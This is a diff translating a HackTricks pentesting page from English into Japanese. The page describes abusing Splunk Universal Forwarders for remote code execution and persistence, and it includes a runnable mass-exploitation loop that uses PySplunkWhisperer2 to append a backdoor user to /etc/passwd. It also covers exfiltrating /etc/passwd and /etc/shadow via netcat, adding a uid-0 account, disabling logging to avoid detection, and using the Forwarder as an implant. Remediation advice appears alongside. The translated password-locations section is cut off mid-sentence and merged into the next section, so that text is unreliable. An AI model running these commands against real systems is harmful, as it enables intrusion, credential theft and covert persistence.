@@ -1,184 +1,173 @@
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手**したいですか、またはHackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
 
-If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.
+**内部**または**外部**のマシンを**列挙**している場合、**Splunkが実行されている**ことを発見します（ポート8090）。もし幸運にも**有効な資格情報**を知っている場合、Splunkサービスを**悪用**して、Splunkを実行しているユーザーとして**シェルを実行**することができます。rootが実行している場合、特権をrootにエスカレーションすることができます。
 
-Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.
+また、すでにrootであり、Splunkサービスがlocalhost以外でリッスンしていない場合、Splunkサービスから**パスワード**ファイルを**盗む**ことができ、パスワードを**クラック**するか、新しい資格情報を追加することができます。そして、ホスト上で持続性を維持します。
 
-In the first  image below you can see how a Splunkd web page looks like.
+最初の画像では、Splunkdのウェブページの見た目が示されています。
 
-**The following information was copied from** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
+**以下の情報は、**[**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)からコピーされました。
 
-# Abusing Splunk Forwarders For Shells and Persistence
+# シェルと持続性のためのSplunk Forwardersの悪用
 
-14 Aug 2020
+2020年8月14日
 
-## Description: <a href="#description" id="description"></a>
+## 説明：<a href="#description" id="description"></a>
 
-The Splunk Universal Forwarder Agent (UF) allows authenticated remote users to send single commands or scripts to the agents through the Splunk API. The UF agent doesn’t validate connections coming are coming from a valid Splunk Enterprise server, nor does the UF agent validate the code is signed or otherwise proven to be from the Splunk Enterprise server. This allows an attacker who gains access to the UF agent password to run arbitrary code on the server as SYSTEM or root, depending on the operating system.
+Splunk Universal Forwarder Agent（UF）は、認証されたリモートユーザーがSplunk APIを介してエージェントに単一のコマンドまたはスクリプトを送信できるようにします。UFエージェントは、接続が有効なSplunk Enterpriseサーバーから来ているかどうかを検証せず、コードが署名されているか、またはSplunk Enterpriseサーバーからのものであることを証明することもありません。これにより、UFエージェントのパスワードにアクセス権を持つ攻撃者は、オペレーティングシステムに応じて、サーバー上でSYSTEMまたはrootとして任意のコードを実行できます。
 
-This attack is being used by Penetration Testers and is likely being actively exploited in the wild by malicious attackers. Gaining the password could lead to the compromise of hundreds of system in a customer environment.
+この攻撃は、ペネトレーションテスターによって使用され、悪意のある攻撃者によって実際に悪用されている可能性があります。パスワードを取得することで、顧客環境内の数百のシステムが危険にさらされる可能性があります。
 
-Splunk UF passwords are relatively easy to acquire, see the secion Common Password Locations for details.
+Splunk UFのパスワードは比較的簡単に取得できます。詳細については、「共通のパスワードの場所」セクションを参照してください。
 
-## Context: <a href="#context" id="context"></a>
+## コンテキスト：<a href="#context" id="context"></a>
 
-Splunk is a data aggregation and search tool often used as a Security Information and Event Monitoring (SIEM) system. Splunk Enterprise Server is a web application which runs on a server, with agents, called Universal Forwarders, which are installed on every system in the network. Splunk provides agent binaries for Windows, Linux, Mac, and Unix. Many organizations use Syslog to send data to Splunk instead of installing an agent on Linux/Unix hosts but agent installation is becomming increasingly popular.
+Splunkは、セキュリティ情報およびイベント監視（SIEM）システムとしてよく使用されるデータ集約および検索ツールです。Splunk Enterprise Serverは、サーバー上で実行されるWebアプリケーションであり、ネットワーク内のすべてのシステムにインストールされるUniversal Forwardersと呼ばれるエージェントがあります。Splunkは、Windows、Linux、Mac、およびUnix向けのエージェントバイナリを提供しています。多くの組織は、Linux/Unixホストにエージェントをインストールする代わりに、Syslogを使用してデータをSplunkに送信しますが、エージェントのインストールがますます人気を集めています。
 
-Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher. As you will note in my demo, complexity is not a requirement as my agent password is 12345678. A remote attacker can brute force the password without lockout, which is a necessity of a log host, since if the account locked out then logs would no longer be sent to the Splunk server and an attacker could use this to hide their attacks. The following screenshot shows the Universal Forwarder agent, this initial page is accessible without authentication and can be used to enumerate hosts running Splunk Universal Forwarder.
+Universal Forwarderは、各ホストでhttps://host:8089でアクセスできます。 /service/などの保護されたAPI呼び出しにアクセスすると、Basic認証ボックスが表示されます。ユーザー名は常にadminであり、パスワードのデフォルトは2016年までchangemeでした。その後、Splunkは新しいインストールに8文字以上のパスワードを設定する必要がありました。デモで示すように、複雑さは要件ではありません。私のエージェントのパスワードは12345678です。リモート攻撃者は、ロックアウトせずにパスワードをブルートフォースできます。これはログホストの必要性です。なぜなら、アカウントがロックアウトされた場合、ログはSplunkサーバーに送信されなくなり、攻撃者はこれを使用して攻撃を隠すことができます。次のスクリーンショットは、Universal Forwarderエージェントを示しています。この初期ページは認証なしでアクセスでき、Splunk Universal Forwarderを実行しているホストを列挙するために使用できます。
 
 ![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)
 
-Splunk documentaiton shows using the same Universal Forwarding password for all agents, I don’t remember for sure if this is a requirement or if individual passwords can be set for each agent, but based on documentaiton and memory from when I was a Splunk admin, I believe all agents must use the same password. This means if the password is found or cracked on one system, it is likely to work on all Splunk UF hosts. This has been my personal experience, allowing compromise of hundreds of hosts quickly.
+Splunkのドキュメントでは、すべてのエージェントに同じUniversal Forwardingパスワードを使用することが示されています。個々のエージェントごとにパスワードを設定できるかどうかは確かではありませんが、ドキュメントとSplunk管理者だったときの記憶に基づいて、すべてのエージェントは同じパスワードを使用する必要があると思われます。したがって、パスワードが1つのシステムで見つかるかクラックされると、すべてのSplunk UFホストで機能する可能性が高いです。これは私の個人的な経験ですが、数百のホストを迅速に危険にさらすことができます。
 
-## Common Password Locations <a href="#common-password-locations" id="common-password-locations"></a>
+## 共通のパスワードの場所<a href="#common-password-locations" id="common-password-locations"></a>
 
-I often find the Splunk Universal Forwarding agent plain text password in the following locations on networks:
+ネットワーク上の以下の場所で、Splunk Universal Forwardingエージェントの平文パスワードをよく見つけます。
 
-1. Active Directory Sysvol/domain.com/Scripts directory. Administrators store the executible and the password together for efficient agent installation.
-2. Network file shares hosting IT installation files
-3. Wiki or other build note repositories on internal network
+1. Active Directory Sysvol/domain.com/Scriptsディレクトリ。管理者は、効率的なエージェントのインストール
+## 影響: <a href="#impact" id="impact"></a>
 
-The password can also be accessed in hashed form in Program Files\Splunk\etc\passwd on Windows hosts, and in /opt/Splunk/etc/passwd on Linux and Unix hosts. An attacker can attempt to crack the password using Hashcat, or rent a cloud cracking environment to increase liklihood of cracking the hash. The password is a strong SHA-256 hash and as such a strong, random password is unlikely to be cracked.
+Splunk Universal Forward Agentのパスワードを持つ攻撃者は、ネットワーク内のすべてのSplunkホストを完全に侵害し、各ホストでSYSTEMまたはrootレベルの権限を取得することができます。私はSplunkエージェントをWindows、Linux、およびSolaris Unixホストで成功裏に使用しています。この脆弱性により、システムの資格情報がダンプされ、機密データが持ち出され、ランサムウェアがインストールされる可能性があります。この脆弱性は、高速で使いやすく、信頼性があります。
 
-## Impact: <a href="#impact" id="impact"></a>
+Splunkはログを処理するため、攻撃者は最初のコマンド実行時にUniversal Forwarderの場所を変更して、Splunk SIEMへのログ記録を無効にすることができます。これにより、クライアントのBlue Teamによる発見の可能性が大幅に低下します。
 
-An attacker with a Splunk Universal Forward Agent password can fully compromise all Splunk hosts in the network and gain SYSTEM or root level permissions on each host. I have successfully used the Splunk agent on Windows, Linux, and Solaris Unix hosts. This vulnerability could allow system credentials to be dumped, sensitive data to be exfiltrated, or ransomware to be installed. This vulnerability is fast, easy to use, and reliable.
+Splunk Universal Forwarderは、ログ収集のために頻繁にドメインコントローラにインストールされており、これにより攻撃者はNTDSファイルを抽出したり、さらなる攻撃のためにアンチウイルスを無効にしたり、ドメインを変更したりすることが容易になります。
 
-Since Splunk handles logs, an attacker could reconfigure the Universal Forwarder on the first command run to change the Forwarder location, disabling logging to the Splunk SIEM. This would drastically reduce the chances of being caught by the client Blue Team.
+最後に、Universal Forwarding Agentはライセンスを必要とせず、パスワードスタンドアロンで構成することができます。そのため、Splunkを使用しない顧客であっても、この合法的なアプリケーションをホスト上のバックドア持続性メカニズムとしてインストールすることができます。
 
-Splunk Universal Forwarder is often seen installed on Domain Controllers for log collection, which could easily allow an attacker to extract the NTDS file, disable antivirus for further exploitation, and/or modify the domain.
+## 証拠: <a href="#evidence" id="evidence"></a>
 
-Finally, the Universal Forwarding Agent does not require a license, and can be configured with a password stand alone. As such an attacker can install Universal Forwarder as a backdoor persistence mechanism on hosts, since it is a legitimate application which customers, even those who do not use Splunk, are not likely to remove.
+攻撃例を示すために、最新のSplunkバージョンを使用してEnterprise ServerとUniversal Forwarding Agentのテスト環境をセットアップしました。以下の10枚の画像がこのレポートに添付されており、次の内容を示しています：
 
-## Evidence: <a href="#evidence" id="evidence"></a>
-
-To show an exploitation example I set up a test environment using the latest Splunk version for both the Enterprise Server and the Universal Forwarding agent. A total of 10 images have been attached to this report, showing the following:
-
-1- Requesting the /etc/passwd file through PySplunkWhisper2
+1- PySplunkWhisper2を介して/etc/passwdファイルをリクエストする
 
 ![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)
 
-2- Receiving the /etc/passwd file on the attacker system through Netcat
+2- Netcatを介して攻撃者システムに/etc/passwdファイルを受信する
 
 ![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)
 
-3- Requesting the /etc/shadow file through PySplunkWhisper2
+3- PySplunkWhisper2を介して/etc/shadowファイルをリクエストする
 
 ![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)
 
-4- Receiving the /etc/shadow file on the attacker system through Netcat
+4- Netcatを介して攻撃者システムに/etc/shadowファイルを受信する
 
 ![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)
 
-5- Adding the user attacker007 to the /etc/passwd file
+5- /etc/passwdファイルにユーザーattacker007を追加する
 
 ![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)
 
-6- Adding the user attacker007 to the /etc/shadow file
+6- /etc/shadowファイルにユーザーattacker007を追加する
 
 ![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)
 
-7- Receiving the new /etc/shadow file showing attacker007 is successfully added
+7- attacker007が正常に追加された新しい/etc/shadowファイルを受信する
 
 ![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)
 
-8- Confirming SSH access to the victim using the attacker007 account
+8- attacker007アカウントを使用して被害者へのSSHアクセスを確認する
 
 ![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)
 
-9- Adding a backdoor root account with username root007, with the uid/gid set to 0
+9- uid/gidを0に設定したユーザーroot007をバックドアのルートアカウントとして追加する
 
 ![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)
 
-10- Confirming SSH access using attacker007, and then escalating to root using root007
+10- attacker007を使用してSSHアクセスを確認し、root007を使用してrootにエスカレーションする
 
 ![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)
 
-At this point I have persistent access to the host both through Splunk and through the two user accounts created, one of which provides root. I can disable remote logging to cover my tracks and continue attacking the system and network using this host.
+この時点で、Splunkおよび作成された2つのユーザーアカウントを介してホストへの持続的なアクセスが可能です。リモートログ記録を無効にして自分の行動を隠し、このホストを使用してシステムおよびネットワークへの攻撃を継続することができます。
 
-Scripting PySplunkWhisperer2 is very easy and effective.
+PySplunkWhisperer2のスクリプト作成は非常に簡単で効果的です。
 
-1. Create a file with IP’s of hosts you want to exploit, example name ip.txt
-2. Run the following:
-
+1. 攻撃したいホストのIPを記載したファイルを作成します。例えば、ip.txtという名前のファイルです。
+2. 以下を実行します：
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-
-Host information:
+ホスト情報：
 
 Splunk Enterprise Server: 192.168.42.114\
 Splunk Forwarder Agent Victim: 192.168.42.98\
-Attacker:192.168.42.51
+攻撃者: 192.168.42.51
 
-Splunk Enterprise version: 8.0.5 (latest as of August 12, 2020 – day of lab setup)\
-Universal Forwarder version: 8.0.5 (latest as of August 12, 2020 – day of lab setup)
+Splunk Enterpriseバージョン: 8.0.5（2020年8月12日時点での最新バージョン）\
+Universal Forwarderバージョン: 8.0.5（2020年8月12日時点での最新バージョン）
 
-### Remediation Recommendation’s for Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>
+### Splunk, Inc.への対策推奨事項: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>
 
-I recommend implementing all of the following solutions to provide defense in depth:
+以下のすべての解決策を実装することをお勧めします。
 
-1. Ideally, the Universal Forwarder agent would not have a port open at all, but rather would poll the Splunk server at regular intervals for instructions.
-2. Enable TLS mutual authentication between the clients and server, using individual keys for each client. This would provide very high bi-directional security between all Splunk services. TLS mutual authentication is being heavily implemented in agents and IoT devices, this is the future of trusted device client to server communication.
-3. Send all code, single line or script files, in a compressed file which is encrypted and signed by the Splunk server. This does not protect the agent data sent through the API, but protects against malicious Remote Code Execution from a 3rd party.
+1. 理想的には、Universal Forwarderエージェントはポートを開けず、代わりに一定の間隔でSplunkサーバーから指示をポーリングするようにします。
+2. クライアントとサーバー間でTLS相互認証を有効にし、各クライアントに個別のキーを使用します。これにより、すべてのSplunkサービス間で非常に高い双方向セキュリティが提供されます。TLS相互認証は、エージェントやIoTデバイスで広く実装されており、これが信頼されたデバイスクライアントからサーバーへの通信の未来です。
+3. スクリプトファイルや単一行のコードを、Splunkサーバーによって暗号化および署名された圧縮ファイルで送信します。これにより、APIを介して送信されるエージェントデータ自体は保護されませんが、第三者からの悪意のあるリモートコード実行に対して保護されます。
 
-### Remediation Recommendation’s for Splunk customers: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>
+### Splunkの顧客への対策推奨事項: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>
 
-1. Ensure a very strong password is set for Splunk agents. I recommend at least a 15-character random password, but since these passwords are never typed this could be set to a very large password such as 50 characters.
-2. Configure host based firewalls to only allow connections to port 8089/TCP (Universal Forwarder Agent’s port) from the Splunk server.
+1. Splunkエージェントには非常に強力なパスワードを設定してください。少なくとも15文字のランダムなパスワードを推奨しますが、これらのパスワードは入力されないため、50文字など非常に長いパスワードに設定することもできます。
+2. ホストベースのファイアウォールを設定し、Splunkサーバーからのみポート8089/TCP（Universal Forwarderエージェントのポート）への接続を許可します。
 
-## Recommendations for Red Team: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>
+## Red Team向けの推奨事項: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>
 
-1. Download a copy of Splunk Universal Forwarder for each operating system, as it is a great light weight signed implant. Good to keep a copy incase Splunk actually fixes this.
+1. 各オペレーティングシステム用にSplunk Universal Forwarderのコピーをダウンロードしておくと、軽量で署名された侵入ツールとして非常に便利です。Splunkが実際にこれを修正する場合に備えて、コピーを保持しておくと良いでしょう。
 
-## Exploits/Blogs from other researchers <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>
+## 他の研究者によるエクスプロイト/ブログ <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>
 
-Usable public exploits:
+使用可能な公開エクスプロイト：
 
 * https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 * https://www.exploit-db.com/exploits/46238
 * https://www.exploit-db.com/exploits/46487
 
-Related blog posts:
+関連するブログ記事：
 
 * https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
 * https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
 * https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool
 
-_** Note: **_ This issue is a serious issue with Splunk systems and it has been exploited by other testers for years. While Remote Code Execution is an intended feature of Splunk Universal Forwarder, the implimentaion of this is dangerous. I attempted to submit this bug via Splunk’s bug bounty program in the very unlikely chance they are not aware of the design implications, but was notified that any bug submissions implement the Bug Crowd/Splunk disclosure policy which states no details of the vulnerability may be discussed publically _ever_ without Splunk’s permission. I requested a 90 day disclosure timeline and was denied. As such, I did not responsibly disclose this since I am reasonably sure Splunk is aware of the issue and has chosen to ignore it, I feel this could severely impact companies, and it is the responsibility of the infosec community to educate businesses.
+_**注意:**_ この問題はSplunkシステムにおける深刻な問題であり、他のテスターによって数年間にわたって悪用されてきました。リモートコード実行はSplunk Universal Forwarderの意図的な機能ですが、その実装は危険です。私はSplunkのバグバウンティプログラムを通じてこのバグを提出しようとしましたが、設計上の影響について気づいていない可能性が非常に低いため、バグの詳細を公に議論することはBug Crowd/Splunkの開示ポリシーによって禁止されています。90日の開示期限を要求しましたが、拒否されました。したがって、私は責任を持ってこれを開示しませんでした。Splunkがこの問題に気づいており、無視している可能性が非常に高いため、これは企業に深刻な影響を与える可能性があり、情報セキュリティコミュニティの責任は企業に教育することです。
 
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンやHackTricksのPDFをダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**または**[telegramグループ](https://t.me/peass)**に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
 
 </details>
-
-
